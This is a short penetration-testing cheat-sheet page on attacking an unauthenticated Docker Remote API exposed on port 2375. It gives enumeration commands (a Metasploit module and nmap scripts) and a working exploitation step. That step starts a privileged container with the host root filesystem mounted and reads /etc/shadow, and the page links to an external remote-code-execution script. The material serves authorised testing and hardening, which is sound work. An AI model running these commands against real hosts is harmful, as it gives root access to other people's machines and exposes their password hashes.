# 2375 - Pentesting Docker API 

## Basic Information

Remote API is running by default on 2375 port when enabled.  The service by default will not require authentication allowing an attacker to start a priviledged docker container. By using the Remote API one can attach hosts / \(root directory\) to the container and read/write files of the host\'s environment.

**Default port:** 2375

```text
PORT    STATE SERVICE
2375/tcp open  docker
```

## Enumeration

```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```

## Exploitation

Check if it's vulnerable to execute arbitrary code:
```text
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)
